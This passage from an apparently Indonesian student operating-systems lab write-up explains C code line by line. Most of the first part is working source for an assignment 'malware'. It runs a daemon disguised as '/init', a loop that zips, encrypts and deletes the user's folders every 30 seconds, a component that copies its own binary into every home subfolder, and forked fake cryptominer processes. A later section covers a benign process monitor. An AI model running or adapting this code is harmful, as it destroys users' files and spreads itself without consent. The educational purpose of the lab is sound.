        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            delete_directory(fullpath);
        } else {
            unlink(fullpath);
        }
    }

    closedir(dir);
    rmdir(path);
}
```
Menghapus semua isi dari direktori (rekursif) pakai `unlink`, termasuk subfolder
Setelah kosong, hapus folder induknya pakai `rmdir`
- `struct stat st;
    if (stat(fullpath, &st) == -1) continue;` Ambil metadata.
- `if (S_ISDIR(st.st_mode)) {
        delete_directory(fullpath);
    } else {
        unlink(fullpath);
    }` Jika direktori: panggil ulang delete_directory. Jika file biasa: hapus dengan unlink.

```sh
void zip_and_encrypt() {
    DIR *dir = opendir(".");
    if (!dir) {
        perror("Gagal membuka direktori");
        return;
    }

    struct dirent *entry;
    char exe_path[1024];
    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    exe_path[sizeof(exe_path) - 1] = '\0';

    pid_t zip_pids[1024];
    char folders_to_delete[1024][256];
    int pid_index = 0;
    int folder_index = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        struct stat st;
        if (stat(entry->d_name, &st) == -1)
            continue;

        if (S_ISDIR(st.st_mode)) {
            char zipname[1024];
            snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);

            pid_t pid = fork();
            if (pid == 0) {
                char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
                execvp("zip", argv);
                perror("execvp zip gagal");
                exit(1);
            } else if (pid > 0) {
                zip_pids[pid_index++] = pid;
                strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
            }
        }
    }
    closedir(dir);

    for (int i = 0; i < pid_index; i++) {
        int status;
        waitpid(zip_pids[i], &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Zip gagal untuk folder indeks %d\n", i);
        }
    }

    encrypt_all_files(".", exe_path);
    printf("Encryption don.\n");

    for (int i = 0; i < folder_index; i++) {
        delete_directory(folders_to_delete[i]);
        printf("Folder %s deleted.\n", folders_to_delete[i]);
    }
}
```
- `struct dirent *entry;
char exe_path[1024];
readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
exe_path[sizeof(exe_path) - 1] = '\0';` Ambil path lengkap dari executable yang sedang berjalan agar tidak dienkripsi oleh `encrypt_all_files`.
- `snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);
	pid_t pid = fork();
        if (pid == 0) {
            char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
            execvp("zip", argv);
            perror("execvp zip gagal");
            exit(1);
        } else if (pid > 0) {
            zip_pids[pid_index++] = pid;
            strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
        }}` Buat .zip berisi folder tersebut (pakai `zip -r`)
- Simpan nama foldernya agar nanti dihapus
- Tunggu semua proses zip selesai
- Jalankan `encrypt_all_files()` → mengenkripsi semua `.zip` dan file lainnya (kecuali `malware.c` sendiri)
- Hapus folder-folder asli dengan `delete_directory()`

```sh
void wannacryptor() {
    FILE *log = fopen("/tmp/wannalog.txt", "a+");
    if (!log) exit(1);

    while (1) {
        zip_and_encrypt();

        fprintf(log, "[wannacryptor] Enkripsi dijalankan.\n");
        fflush(log);

        sleep(30);
    }
}
```
- `FILE *log = fopen("/tmp/wannalog.txt", "a+");` Membuka file log di path `/tmp/wannalog.txt;` Mode "a+" berarti: buka untuk baca/tulis
- `while (1) {
        zip_and_encrypt();` Mengarsip (zip) semua folder di direktori saat ini, mengenkripsi semua file zip dan file lain, lalu menghapus folder asli setelah zip.
![Screenshot 2025-04-18 110512](https://github.com/user-attachments/assets/5da8a2a8-e587-4585-ac4c-3296b003e9f2)


c. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.
```sh
void trojan_wrm() {
    const char *source = "/proc/self/exe";
    const char *runme_name = "runme";
    const char *target_base = "/home/riverz";

    DIR *dir = opendir(target_base);
    if (!dir) {
        perror("Gagal membuka direktori target");
        exit(1);
    }

    struct dirent *entry;
    char dest_path[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char folder_path[1024];
        snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);

        struct stat st;
        if (stat(folder_path, &st) == -1 || !S_ISDIR(st.st_mode))
            continue;

        snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);

        FILE *src = fopen(source, "rb");
        FILE *dst = fopen(dest_path, "wb");

        if (!src || !dst) {
            perror("Gagal copy file runme");
            if (src) fclose(src);
            if (dst) fclose(dst);
            continue;
        }

        int ch;
        while ((ch = fgetc(src)) != EOF)
            fputc(ch, dst);

        fclose(src);
        fclose(dst);

        chmod(dest_path, 600);

        printf("Berhasil copy ke %s\n", dest_path);
    }

    closedir(dir);

    while (1) {
        sleep(5);
    }
}
```
- `const char *target_base = "/home/riverz";` Folder root tempat malware akan menyebar dan mencari seluruh subdirektori dalam /home/riverz.
- `struct dirent *entry;
char dest_path[1024];`
- entry digunakan untuk membaca isi direktori (readdir).
- dest_path akan menyimpan path lengkap tempat runme akan disalin.
- `while ((entry = readdir(dir)) != NULL) {`Iterasi untuk setiap file/folder dalam /home/riverz.
- `snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);` Gabungkan nama direktori penuh cth: /home/riverz/random
- `snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);` Path akhir tujuan cth: /home/riverz/random/runme.
- `while ((ch = fgetc(src)) != EOF)
        fputc(ch, dst);` Salin isi file byte demi byte dari sumber ke tujuan.
- `while (1) {
    sleep(5);
}` Loop selamanya dengan delay 5 detik untuk mempertahankan proses tetap berjalan agar tidak langsung keluar.

d. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.
```sh
int main(int argc, char *argv[]) {
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));

    if (argc >= 2 && strcmp(argv[1], " ") == 0) {
      prctl(PR_SET_NAME, (unsigned long) argv[0], 0, 0, 0);
      cryptominer(argv[0][strlen(argv[0]) - 1] - '0');           
    }

    if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
            rodok_launcher();
        return 0;
    }

    if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
            wannacryptor();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
            trojan_wrm();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);

        while (1) {
            pid_t pid = fork();
            if (pid == 0) {
                char *args[] = {"wannacryptor", NULL};
                execv("/proc/self/exe", args);
                perror("execv wannacryptor failed");
                exit(1);
            }
        
            pid_t pid2 = fork();
            if (pid2 == 0) {
                char *args[] = {"trojan.wrm", NULL};
                execv("/proc/self/exe", args);
                perror("execv trojan.wrm failed");
                exit(1);
            }

            pid_t pid3 = fork();
            if (pid3 == 0) {
                char *args[] = {"rodok.exe", NULL};
                execv("/proc/self/exe", args);
                perror("execv rodok.exe failed");
                exit(1);
            }
            
            int status;
            waitpid(-1, &status, WNOHANG);

            sleep(30);
        }
    }

    char *newargv[] = { "init", NULL};
    execv("/proc/self/exe", newargv);
    perror("execv init failed");
    exit(1);
}
```
- `sleep(30);` menjalankan childprocess pertama `wannacryptor` dan kedua `trojan.wrm` setiap 30 detik.
![Screenshot 2025-04-18 110626](https://github.com/user-attachments/assets/4506436f-f0cb-4769-bd71-2c75988df2ac)


e. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.
f. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)
g. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: 
[YYYY-MM-DD hh:mm:ss][Miner XX] hash
Dimana XX adalah ID mine-crafter yang membuat hash tersebut.
h. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati.
```sh
void sigterm_handler(int signum) {
    keep_running = 0;
}

void sigterm_handler_rodok(int signum) {
    for (int i = 0; i < 6; i++) {
        if (child[i] > 0) {
            kill(child[i], SIGTERM);
        }
    }
    exit(0);
}

void cryptominer(int id) {
    signal(SIGTERM, sigterm_handler);
    char logpath[] = "/tmp/.miner.log";
    FILE *log = fopen(logpath, "a+");
    if (!log) exit(1);

    srand(time(NULL) + id);

    while (keep_running) {
        char hash[65];
        for (int i = 0; i < 64; i++) {
            int r = rand() % 16;
            hash[i] = "0123456789abcdef"[r];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);

        fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                t->tm_hour, t->tm_min, t->tm_sec,
                id, hash);
        fflush(log);

        sleep((rand() % 28) + 3);
    }

    fclose(log);
}

void rodok_launcher() {
    srand(time(NULL));
    setpgid(0, 0);

    signal(SIGTERM, sigterm_handler_rodok);

    for (int miner_id = 0; miner_id < 6; miner_id++) {
        pid_t pid = fork();
        if (pid == 0) {
            char name[32];
            snprintf(name, sizeof(name), "mine-crafter-%02d", miner_id);

            setpgid(0, 0);

            char *args[] = {name, " ", NULL};
            execv("/proc/self/exe", args);
            perror("execv miner gagal");
            exit(1);
        } else if (pid > 0) {
            child[miner_id] = pid;
        }
    }

    int status;
    while (wait(&status) > 0);
}
```
- `signal(SIGTERM, sigterm_handler);`
Pasang handler untuk `SIGTERM` dan `rodok_launcher` agar bisa shutdown saat disuruh.
- `char logpath[] = "/tmp/.miner.log";
FILE *log = fopen(logpath, "a+");
if (!log) exit(1);` Buka file log tersembunyi (/tmp/.miner.log) untuk mencatat aktivitas miner.
- ```sh
  ``` while (keep_running) {
    char hash[65];
    for (int i = 0; i < 64; i++) {
        int r = rand() % 16;
        hash[i] = "0123456789abcdef"[r];
    }
    hash[64] = '\0';
Membuat string hash acak 64 karakter berupa hex.
- ```sh
  time_t now = time(NULL);
    struct tm *t = localtime(&now);

    fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec,
            id, hash);
    fflush(log);
  ```
  Tulis hash + timestamp + ID ke file log, format: [2025-04-17 22:01:54][Miner 01] 8b2f9c...
- `sleep((rand() % 28) + 3);` Tidur acak antara 3–30 detik.
- `for (int miner_id = 0; miner_id < 6; miner_id++) {
    pid_t pid = fork();
    if (pid == 0) {` Loop buat 6 proses anak.
- `snprintf(name, sizeof(name), "mine-crafter-%02d", miner_id);` Buat nama proses palsu seperti mine-crafter-00, mine-crafter-01....
- `int status;
while (wait(&status) > 0);` Tunggu semua child mati (blocking).
![Screenshot 2025-04-18 110256](https://github.com/user-attachments/assets/760fc55c-83fc-4d0d-8a3d-d931944bb9a2)
![Screenshot 2025-04-18 110626](https://github.com/user-attachments/assets/b44a9738-8e77-479d-9d63-488e98dd333c)

```sh
int main(int argc, char *argv[]) {
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));

    if (argc >= 2 && strcmp(argv[1], " ") == 0) {
      prctl(PR_SET_NAME, (unsigned long) argv[0], 0, 0, 0);
      cryptominer(argv[0][strlen(argv[0]) - 1] - '0');           
    }

    if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
            rodok_launcher();
        return 0;
    }

    if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
            wannacryptor();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
        prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
            trojan_wrm();
        return 0;
    }
    
    if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);

        while (1) {
            pid_t pid = fork();
            if (pid == 0) {
                char *args[] = {"wannacryptor", NULL};
                execv("/proc/self/exe", args);
                perror("execv wannacryptor failed");
                exit(1);
            }
        
            pid_t pid2 = fork();
            if (pid2 == 0) {
                char *args[] = {"trojan.wrm", NULL};
                execv("/proc/self/exe", args);
                perror("execv trojan.wrm failed");
                exit(1);
            }

            pid_t pid3 = fork();
            if (pid3 == 0) {
                char *args[] = {"rodok.exe", NULL};
                execv("/proc/self/exe", args);
                perror("execv rodok.exe failed");
                exit(1);
            }
            
            int status;
            waitpid(-1, &status, WNOHANG);

            sleep(30);
        }
    }

    char *newargv[] = { "init", NULL};
    execv("/proc/self/exe", newargv);
    perror("execv init failed");
    exit(1);
}
```
- `if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
    prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
    rodok_launcher();
    return 0;
}` Jika program dijalankan dengan argumen "rodok.exe", maka menjalankan `rodok_launcher()`.
- `if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
    prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
    wannacryptor();
    return 0;
}` Menjalankan loop ransomware `(zip_and_encrypt)` setiap 30 detik.
- `if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
    prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
    trojan_wrm();
    return 0;
}`Menyalin executable ini ke folder-folder di `/home/riverz/NAMA_FOLDER/runme`.
- `if (argc > 0 && strcmp(argv[0], "init") == 0) {
    daemonize();  // jadi background process
    chdir(cwd);   // balik ke working directory semula
    prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`
- ```if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
  ```
- Jika argumen pertama yang dijalankan adalah `init` maka menjalankan:
  - `daemonize()` Program menjadi proses daemon dan menyamarkan nama proses `/init`, lalu membuat 3 fork yang dijalankan terpisah:
  - `wannacryptor` ransomware (zip + xor + hapus folder).
  - `trojan.wrm`
  - `rodok.exe` Spawner miner palsu.
- `int status;
waitpid(-1, &status, WNOHANG);
sleep(30);` Tidur 30 detik sebelum repeat.
- `char *newargv[] = { "init", NULL };
execv("/proc/self/exe", newargv);
perror("execv init failed");
exit(1);` Jalankan ulang dirinya sendiri sebagai `init`

---

## Soal_4

# Doraemon: Nobita dan Alat Pengintai Proses

```c
#define LOG_PATH "/home/seribu_man/SISOP_2/soal_4/debugmon.log"
```
Lokasi log file tempat semua aktivitas dicatat, seperti proses yang sedang berjalan, proses yang dihentikan, dan status daemon.

---
**get_timestamp**
```c
void get_timestamp(char *buffer, size_t size) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buffer, size, "[%d:%m:%Y]-[%H:%M:%S]", t);
}
```
- Mengisi buffer dengan waktu lokal sekarang dalam format yang telah ditentukan.
- Dipakai untuk memberi timestamp di setiap log entri.

---
**get_uid_from_username**
```c
unsigned int get_uid_from_username(const char *username) {
    FILE *fp = fopen("/etc/passwd", "r");
    if (!fp) {
        perror("/etc/passwd");
        exit(EXIT_FAILURE);
    }

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        char *uname = strtok(line, ":");
        strtok(NULL, ":"); 
        char *uid_str = strtok(NULL, ":");

        if (uname && uid_str && strcmp(uname, username) == 0) {
            fclose(fp);
            return (unsigned int)atoi(uid_str);
        }
    }

    fclose(fp);
    fprintf(stderr, "User '%s' tidak ditemukan\n", username);
    exit(EXIT_FAILURE);
}
```
Fungsi ini bertugas untuk mengambil UID dari user yang namanya diberikan sebagai argumen, dengan cara membaca file `/etc/passwd` . File tersebut berisi info user dalam format terpisah oleh titik dua (`:`), lalu fungsi ini membaca tiap baris, memisahkan field-nya menggunakan `strtok`, dan membandingkan username di baris tersebut dengan input. Jika cocok, UID diambil dari field ketiga dan dikembalikan sebagai hasil fungsi. Kalau tidak ditemukan sampai akhir file, program langsung keluar karena user dianggap tidak valid.

---
**get_uid_from_status**
```c
unsigned int get_uid_from_status(const char *pid) {
    char path[256], line[256];
    snprintf(path, sizeof(path), "/proc/%s/status", pid);

    FILE *fp = fopen(path, "r");
    if (!fp) return (unsigned int)-1;

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "Uid:", 4) == 0) {
            unsigned int uid;
            sscanf(line, "Uid:\t%u", &uid);
            fclose(fp);
            return uid;
        }
    }

    fclose(fp);
    return (unsigned int)-1;
}
```
Fungsi ini digunakan untuk mengambil UID dari sebuah proses berdasarkan PID-nya, dengan cara membuka file `/proc/<pid>/status` dan mencari baris yang diawali dengan "Uid:". File tersebut menyimpan berbagai informasi status proses, dan UID berada di baris itu. Jika file tidak bisa dibuka (misalnya proses sudah mati), maka fungsi mengembalikan -1 sebagai tanda gagal. Ini penting untuk menyaring hanya proses milik user target.

---
**get_command**
```c
void get_command(const char *pid, char *out, size_t size) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%s/comm", pid);
    FILE *fp = fopen(path, "r");
    if (!fp) {
        strncpy(out, "-", size);
        return;
    }

    fgets(out, size, fp);
    out[strcspn(out, "\n")] = 0;
    fclose(fp);
}
```
Fungsi ini mengambil nama executable dari suatu proses berdasarkan PID, dengan cara membaca file `/proc/<pid>/comm` yang berisi nama singkat command tersebut. Nama tersebut kemudian disalin ke buffer output, dan newline (jika ada) dihapus dari akhir string. Kalau file tidak bisa dibuka, fungsi hanya mengisi `out` dengan karakter "-" sebagai fallback.

---
**get_memory_kb**
```c
long get_memory_kb(const char *pid) {
    char path[256], line[256];
    snprintf(path, sizeof(path), "/proc/%s/status", pid);
    FILE *fp = fopen(path, "r");
    if (!fp) return 0;

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "VmRSS:", 6) == 0) {
            long mem;
            sscanf(line, "VmRSS: %ld", &mem);
            fclose(fp);
            return mem;
        }
    }
    fclose(fp);
    return 0;
}
```
Fungsi ini membaca penggunaan memori (RSS, dalam KB) dari suatu proses berdasarkan PID, dengan membuka `/proc/<pid>/status` dan mencari baris yang diawali dengan "VmRSS:". Nilai memori di baris tersebut diambil dan dikembalikan. Jika file tidak bisa dibuka atau baris tidak ditemukan, maka fungsi mengembalikan 0 sebagai default.

---
**get_total_memory_kb**
```c
long get_total_memory_kb() {
    FILE *fp = fopen("/proc/meminfo", "r");
    char line[256];
    if (!fp) return 1;

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "MemTotal:", 9) == 0) {
            long mem;
            sscanf(line, "MemTotal: %ld", &mem);
            fclose(fp);
            return mem;
        }
    }

    fclose(fp);
    return 1;
}
```
Fungsi ini mengambil total memori sistem (RAM fisik) dalam satuan kilobyte, dengan membuka file `/proc/meminfo` dan mencari baris "MemTotal:". Nilai tersebut kemudian dikembalikan. Jika terjadi kesalahan saat membuka file atau parsing, maka nilai fallback 1 dikembalikan untuk menghindari pembagian dengan nol di tempat lain.

---
**get_cpu_usage**
```c
float get_cpu_usage(const char *pid, long uptime_jiffies, long hertz) {
    char path[256], line[1024];
    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
    FILE *fp = fopen(path, "r");
    if (!fp) return 0.0f;

    fgets(line, sizeof(line), fp);
    fclose(fp);

    long utime, stime, starttime;
    sscanf(line,
           "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %ld %ld %*d %*d %*d %*d %*d %ld",
           &utime, &stime, &starttime);

    long total_time = utime + stime;
    long seconds = uptime_jiffies / hertz - starttime / hertz;
    if (seconds <= 0) return 0.0f;

    return 100.0f * ((float)total_time / hertz) / seconds;
}
```
Fungsi ini menghitung persentase penggunaan CPU dari sebuah proses, dengan membaca file `/proc/<pid>/stat` dan mengambil nilai utime, stime, dan starttime. Waktu proses dijalankan dikurangi dari uptime sistem untuk tahu berapa lama proses hidup, lalu dibagi dengan waktu CPU aktifnya untuk mendapatkan persentase. Jika proses terlalu baru (waktu hidupnya nol), hasil dikembalikan sebagai 0%.

---
**List**
```c
void list_user_processes(const char *username) {
    unsigned int uid = get_uid_from_username(username);
    long total_mem_kb = get_total_memory_kb();
    long hertz = sysconf(_SC_CLK_TCK);

    FILE *uptime_fp = fopen("/proc/uptime", "r");
    if (!uptime_fp) return;
    double uptime_sec;
    fscanf(uptime_fp, "%lf", &uptime_sec);
    fclose(uptime_fp);
    long uptime_jiffies = (long)(uptime_sec * hertz);

    DIR *dir = opendir("/proc");
    struct dirent *entry;

    printf("%-8s %-20s %8s %8s\n", "PID", "COMMAND", "CPU(%)", "MEM(%)");
    printf("--------------------------------------------\n");

    FILE *log = fopen(LOG_PATH, "a");
    char timestamp[64];

    while ((entry = readdir(dir)) != NULL) {
        struct stat st;
        char fullpath[512];
        snprintf(fullpath, sizeof(fullpath), "/proc/%s", entry->d_name);

        if (isdigit(entry->d_name[0]) && stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {
            char *pid = entry->d_name;
            if (get_uid_from_status(pid) != uid) continue;

            char cmd[128];
            get_command(pid, cmd, sizeof(cmd));
            long mem_kb = get_memory_kb(pid);
            float mem_percent = 100.0f * mem_kb / total_mem_kb;
            float cpu_percent = get_cpu_usage(pid, uptime_jiffies, hertz);

            printf("%-8s %-20s %8.2f %8.2f\n", pid, cmd, cpu_percent, mem_percent);

            get_timestamp(timestamp, sizeof(timestamp));
            fprintf(log, "%s_%s_RUNNING\n", timestamp, cmd);
        }
    }

    fclose(log);
    closedir(dir);
}
```
Fungsi ini menampilkan semua proses milik user tertentu dalam bentuk tabel berisi PID, nama proses, CPU usage, dan memori usage. Ia membuka folder `/proc`, menyaring direktori yang merupakan PID, lalu memeriksa UID pemilik proses dan hanya mencetak jika cocok dengan UID user target. Setiap entri juga dicatat ke log `/home/seribu_man/SISOP_2/soal_4/debugmon.log` dengan format timestamp_nama_RUNNING.

---
**Daemon**
```c
void run_as_daemon(const char *username) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    pid_t sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    char pidpath[256];
    snprintf(pidpath, sizeof(pidpath), "/tmp/debugmon-%s.pid", username);
    FILE *pidfp = fopen(pidpath, "w");
    if (pidfp) {
        fprintf(pidfp, "%d", getpid());
        fclose(pidfp);
    }

    unsigned int uid = get_uid_from_username(username);
    long total_mem_kb = get_total_memory_kb();
    long hertz = sysconf(_SC_CLK_TCK);
    char timestamp[64];

    while (1) {
        FILE *uptime_fp = fopen("/proc/uptime", "r");
        if (!uptime_fp) continue;
        double uptime_sec;
        fscanf(uptime_fp, "%lf", &uptime_sec);
        fclose(uptime_fp);
        long uptime_jiffies = (long)(uptime_sec * hertz);

        DIR *dir = opendir("/proc");
        struct dirent *entry;
        FILE *log = fopen(LOG_PATH, "a");

        while ((entry = readdir(dir)) != NULL) {
            struct stat st;
            char fullpath[512];
            snprintf(fullpath, sizeof(fullpath), "/proc/%s", entry->d_name);

            if (isdigit(entry->d_name[0]) && stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {
                char *pid = entry->d_name;
                if (get_uid_from_status(pid) != uid) continue;

                char cmd[128];
                get_command(pid, cmd, sizeof(cmd));
                get_timestamp(timestamp, sizeof(timestamp));
                fprintf(log, "%s_%s_RUNNING\n", timestamp, cmd);
            }
        }

        fprintf(log, "----------------------------------------\n");
        fclose(log);
        closedir(dir);
        sleep(5);
    }
}
```
Fungsi ini menjalankan debugmon sebagai daemon (background process) untuk user tertentu, mencatat proses milik user tersebut setiap 5 detik ke file log. Proses utama akan fork dan keluar, lalu child process membuat session baru, menutup file descriptor standar, dan menyimpan PID-nya di file `/tmp/debugmon-<username>.pid`. Setiap iterasi, ia membuka `/proc`, mencari proses milik user target, dan mencatat statusnya ke log lengkap dengan timestamp.

---
**Stop**
```c
void stop_daemon(const char *username) {
    char pidfile[256];
    snprintf(pidfile, sizeof(pidfile), "/tmp/debugmon-%s.pid", username);

    FILE *fp = fopen(pidfile, "r");
    if (!fp) {
        perror("PID file tidak ditemukan");
        return;
    }

    int pid;
    fscanf(fp, "%d", &pid);
    fclose(fp);

    if (kill(pid, SIGTERM) == 0) {
        remove(pidfile);
        printf("Daemon dihentikan.\n");
    } else {
        perror("Gagal menghentikan daemon");
    }
}
```
Fungsi ini menghentikan daemon debugmon milik user tertentu dengan membaca file PID yang terletak di `/tmp/debugmon-<username>.pid`, mengambil PID-nya, lalu mengirim sinyal `SIGTERM` untuk mematikan proses tersebut. Jika berhasil, file PID dihapus dan pesan keberhasilan ditampilkan.

---
**Fail**
```c
void fail(const char *username) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    setsid();
    chdir("/");

    char pidfile[256];
    snprintf(pidfile, sizeof(pidfile), "/tmp/debugmon-fail-%s.pid", username);
    FILE *fp = fopen(pidfile, "w");
    if (fp) {
        fprintf(fp, "%d", getpid());
        fclose(fp);
    }

    const char *whitelist[] = {
        "bash", "sh", "zsh", "sudo", "revert_daemon"
    };
    int whitelist_size = sizeof(whitelist) / sizeof(whitelist[0]);

    unsigned int uid = get_uid_from_username(username);
    char timestamp[64];

    while (1) {
        DIR *dir = opendir("/proc");
        if (!dir) continue;
        struct dirent *entry;
        FILE *log = fopen(LOG_PATH, "a");

        while ((entry = readdir(dir)) != NULL) {
            if (!isdigit(entry->d_name[0])) continue;

            char proc_path[512];
            snprintf(proc_path, sizeof(proc_path), "/proc/%s", entry->d_name);
            struct stat st;
            if (stat(proc_path, &st) == -1 || !S_ISDIR(st.st_mode)) continue;

            if (st.st_uid != uid) continue;

            int pid_int = atoi(entry->d_name);
            if (pid_int == getpid()) continue;

            char cmdline[128] = "";
            get_command(entry->d_name, cmdline, sizeof(cmdline));

            int allowed = 0;
            for (int i = 0; i < whitelist_size; ++i) {
                if (strcmp(cmdline, whitelist[i]) == 0) {
                    allowed = 1;
                    break;
                }
            }

            if (!allowed) {
                if (kill(pid_int, SIGKILL) == 0) {
                    get_timestamp(timestamp, sizeof(timestamp));
                    if (log) fprintf(log, "%s_KILLED_%s\n", timestamp, cmdline);
                }
            }
        }

        if (log) fclose(log);
        closedir(dir);
        sleep(2);
    }
}
```
Fungsi ini menjalankan mode fail-safe, yaitu daemon yang aktif memantau proses milik user target, dan jika menemukan proses yang bukan bagian dari whitelist (seperti bash, sh, sudo, zsh, revert_daemon), maka proses tersebut akan langsung dihentikan menggunakan `SIGKILL`. Setiap eksekusi proses yang dibunuh akan dicatat di log dengan format timestamp_KILLED_nama. Daemon ini juga menyimpan PID-nya di `/tmp/debugmon-fail-<username>.pid`.

---
**Revert**
```c
void revert(const char *username) {
    if (getuid() != 0) {
        fprintf(stderr, "Revert hanya boleh dilakukan oleh root.\n");
        return;
    }

    char pidfile[256];
    snprintf(pidfile, sizeof(pidfile), "/tmp/debugmon-fail-%s.pid", username);

    FILE *fp = fopen(pidfile, "r");
    if (!fp) {
        perror("PID file tidak ditemukan");
        return;
    }

    int pid;
    fscanf(fp, "%d", &pid);
    fclose(fp);

    if (kill(pid, SIGTERM) == 0) {
        remove(pidfile);
        FILE *log = fopen(LOG_PATH, "a");
        char timestamp[64];
        get_timestamp(timestamp, sizeof(timestamp));
        fprintf(log, "%s_REVERT_SUCCESS\n", timestamp);
        fclose(log);
    } else {
        perror("Gagal menghentikan daemon");
    }
}
```
Fungsi ini menghentikan mode `fail` dengan membaca file PID dari `/tmp/debugmon-fail-<username>.pid` dan mengirimkan `SIGTERM` ke daemon tersebut. Fungsi ini hanya bisa dijalankan oleh root (diperiksa dengan `getuid()`), dan jika berhasil, mencatat `REVERT_SUCCESS` ke log. Jika gagal, pesan error akan ditampilkan.

---
**Main**
```c
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Gunakan: %s [list|daemon|stop|fail|revert] <username>\n", argv[0]);
        return 1;
    }

    const char *mode = argv[1];
    const char *username = argv[2];

    if (strcmp(mode, "list") == 0) {
        list_user_processes(username);
